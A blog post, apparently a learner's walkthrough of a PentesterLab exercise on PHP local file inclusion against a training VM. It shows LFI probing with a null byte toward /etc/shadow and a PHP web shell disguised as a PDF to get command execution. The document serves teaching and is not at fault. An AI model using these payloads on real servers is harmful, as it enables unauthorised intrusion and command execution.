---
layout: post
title: "PentesterLab Bootcamp - Local File Include"
date: 2017-01-18
description: "Walk-through guide to PentesterLab's bootcamp."
number: "0x0a"
---
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

This is part 5.2 of my write-up of PentesterLab's [Bootcamp](https://pentesterlab.com/bootcamp) course. If you see any errors or want to suggest I do something different, please [contact me](https://www.maxmunday.com/contact/) to let me know.

Write-up parts [1](https://www.maxmunday.com/blog/2016/05/14/pentesterlab-bootcamp-part-1-linux-and-scripting), [2](https://www.maxmunday.com/blog/2016/05/22/pentesterlab-bootcamp-part-2-http), [3](https://www.maxmunday.com/blog/2016/05/27/pentesterlab-bootcamp-part-3-php-and-dns), [4](https://www.maxmunday.com/blog/2016/08/09/pentesterlab-bootcamp-part-4-ssl-tls), [5.1](https://www.maxmunday.com/blog/2017/01/04/pentesterlab-bootcamp-part-5.1-sql-injection), [5.2](https://www.maxmunday.com/blog/2017/01/18/pentesterlab-bootcamp-part-5.2-local-file-include).


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

<pre>
                   * * * [ DISCLAIMER ] * * *
/*
 * All information in this write-up is, to the best of my knowledge,  
 * truthful and accurate. However, I am only new to this, and I am   
 * learning as I go, so it is entirely possible something contained  
 * within this write-up is incorrect in some way. Never execute any  
 * command, without knowing for sure what it is you are doing. Look  
 * at the man pages of all commands if you do not understand them.  
 *
 * I take no responsibility if you decide to use this information   
 * to commit illegal acts. If you attempt to use these techniques  
 * against devices or networks you do not either own, or have    
 * permission to attack, you could end up in prison.  
 *
 */  
</pre>
 
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Step 5 ]
 
This is the second part of step 5. This step has us run through two of PentesterLab's exercises: [From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell) (write-up available [here](https://www.maxmunday.com/blog/2017/01/04/pentesterlab-bootcamp-part-5.1-sql-injection)) and [PHP Include And Post Exploitation](https://pentesterlab.com/exercises/php_include_and_post_exploitation). Download the ISOs and run them in a VM, then access them in a browser using the IP address. [Here](https://www.youtube.com/watch?v=kdYuJDWxOHc) is a video if you need help setting it up.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ PHP Include and Post Exploitation ]

PentesterLab provide an informative [written course](https://pentesterlab.com/exercises/php_include_and_post_exploitation/course) to work through for this exercise. I will not go through everything, I will just do a write-up of the solution as I see it. Run through their course to get the complete learning experience. 

\-\-[ Fingerprinting ]

This intial step is neccesary to gather information about the technologies in use within the web application. This is useful in determining what vulnerabilities may exist or where we can search for them. 

First we will run [Nikto](http://cirt.net/nikto2) on the webserver to check for known vulnerabilities and configuration issues.

![](/pictures/php_include_1.png){:height="288px" width="607px"}

It shows the following issues:

\* the version of Apache and PHP;  
\* a potential PHP include issue;  
\* a false positive (OSVDB-3126);  
\* OSVDB-12184 when PHP is configured with `exposed_php` turned on;  
\* some directories than can indexed;  
\* a login page.

\-\-[ Detection of PHP includes ]

To test for the PHP include issue we will try to generate some file inclusion error messages to get a better understanding of what we're dealing with.

We test with `vulnerable/index.php?page=randomvalue` and the following error is generated

![](/pictures/php_include_2.png){:height="61px" width="507px"}

We can see that the `.php` suffix has been added by the PHP code. 

Next we will try to access `/etc/shadow` using a Null Byte (`%00`) to escape the `.php` suffix

![](/pictures/php_include_3.png){:height="53px" width="588px"}

The `Permission denied` error message shows us that our Null Byte has worked.

We can test for remote file include by attempting to access `http://vulnerable/index.php?page=http://www.google.com/?`. If this is successful the Google page will open within the `vulnerable` page.

![](/pictures/php_include_4.png){:height="288px" width="640px"} 

From this error we can see that this system is not vulnerable to remote file inclusion and so we can assume there is a local file include vulnerablity. 

\-\-[ Exploitation ] 

To exploit a local file include we need to find a way to get the PHP code in a file on the system and get this code to be included. 

There can be many ways to do this, but we will attempt to upload our PHP code through the "Call for Papers" upload functionality on the application.

The application only accepts uploads in PDF format so we will create a PHP file that will appear to be a PDF to bypass the check.

To do this we create a text file with the following code

{% highlight shell %}
$ nano lfi
{% endhighlight %}

{% highlight php %}
%PDF-1.4
<?php
  system($_GET["cmd"]);
?>
{% endhighlight %}

{% highlight shell %}
$ mv lfi lfi.pdf
{% endhighlight %}

The `%PDF-1.4` is the identifier that is checked by the PHP function `mime_content_type` in order to determine its type as a PDF. 

We can test to see if this will be interpreted as a PDF by the content-type checker by using the following code

{% highlight php %}
<?php
echo mime_content_type('lfi.pdf') . "\n";
?>
{% endhighlight %}

And when we run it, we get 

![](/pictures/php_include_5.png){:height="38px" width="313px"}

Success! We have PHP code contained within what appears to be a PDF file.

We can now upload it via the "Call for Papers" section in the application. We need to add a username:password and submit our PDF. Once it is submitted, log back in and access the file location.

We can now access `vulnerable/index.php?page=uploads/lfi.pdf%00&cmd= ` to execute commands

![](/pictures/php_include_6.png){:height="228px" width="589px"}

NB: The course continues through shells, reverse shells and TCP redirection which I will go through in a different post.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

/*\*\* [Part 1 - Linux and Scripting](https://www.maxmunday.com/blog/2016/05/14/pentesterlab-bootcamp-part-1-linux-and-scripting) \*\*\*/

/*\*\* [Part 2 - HTTP](https://www.maxmunday.com/blog/2016/05/22/pentesterlab-bootcamp-part-2-http) \*\*\*/

/*\*\* [Part 3 - PHP and DNS](https://www.maxmunday.com/blog/2016/05/27/pentesterlab-bootcamp-part-3-php-and-dns) \*\*\*/

/*\*\* [Part 4 - SSL/TLS](https://www.maxmunday.com/blog/2016/08/09/pentesterlab-bootcamp-part-4-ssl-tls) \*\*\*/

/*\*\* [Part 5.1 - SQL Injection](https://www.maxmunday.com/blog/2017/01/04/pentesterlab-bootcamp-part-5.1-sql-injection) \*\*\*/

/*\*\* Part 6- More SQL Injection COMING SOON \*\*\*/

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
